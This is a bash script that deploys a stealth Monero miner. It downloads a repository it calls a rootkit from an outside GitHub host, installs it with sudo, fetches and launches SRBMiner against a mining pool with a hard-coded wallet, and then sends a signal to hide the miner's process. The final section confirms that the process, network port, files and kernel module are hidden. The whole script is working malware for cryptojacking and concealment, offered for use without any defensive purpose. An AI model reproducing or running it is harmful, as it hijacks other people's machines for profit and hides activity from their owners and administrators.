#!/bin/bash

# Singularity Stealth Mining - Auto Deploy
# Replace YOUR_GITHUB_USERNAME and YOUR_REPO_NAME below

GITHUB_USER="temporaxinfinity-pixel"
REPO_NAME="development"
GITHUB_URL="https://github.com/${GITHUB_USER}/${REPO_NAME}/archive/refs/heads/main.zip"

echo "[*] Singularity Stealth Mining - Auto Deployment"
echo "[*] Downloading from: ${GITHUB_URL}"
echo ""

cd /tmp

# Download configured Singularity
echo "[*] Downloading configured rootkit..."
wget -q -O singularity.zip "${GITHUB_URL}"

if [ $? -ne 0 ]; then
    echo "[!] Download failed. Check GitHub URL"
    exit 1
fi

unzip -q singularity.zip
mv ${REPO_NAME}-main Singularity
rm singularity.zip

cd Singularity

echo "[*] Installing rootkit..."
sudo bash setup.sh

if [ $? -ne 0 ]; then
    echo "[!] Rootkit installation failed"
    exit 1
fi

cd /tmp

echo "[*] Downloading SRBMiner..."
wget -q -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
tar -xzf SRBMiner-Multi.tar.gz
rm -f SRBMiner-Multi.tar.gz
mv SRBMiner-Multi-3-4-3 singularity_miner
cd singularity_miner
chmod +x SRBMiner-MULTI

echo "[*] Starting mining..."
tmux new-session -d -s singularity_work './SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/StealthRig"'

sleep 5

PID=$(pgrep -f SRBMiner-MULTI)

if [ -n "$PID" ]; then
    echo "[*] Miner PID: $PID - Hiding..."
    kill -59 $PID
    sleep 2
    
    echo ""
    echo "=== VERIFICATION ==="
    ps aux | grep -i srbminer | grep -v grep || echo "✓ Process hidden"
    ss -tulpn | grep 8029 || echo "✓ Network hidden"
    ls /tmp | grep singularity || echo "✓ Files hidden"
    lsmod | grep singularity || echo "✓ Rootkit hidden"
    
    echo ""
    echo "[✓] DEPLOYMENT COMPLETE"
    echo "Tmux: tmux attach -t singularity_work"
else
    echo "[!] Miner failed to start"
fi

rm -rf /tmp/Singularity
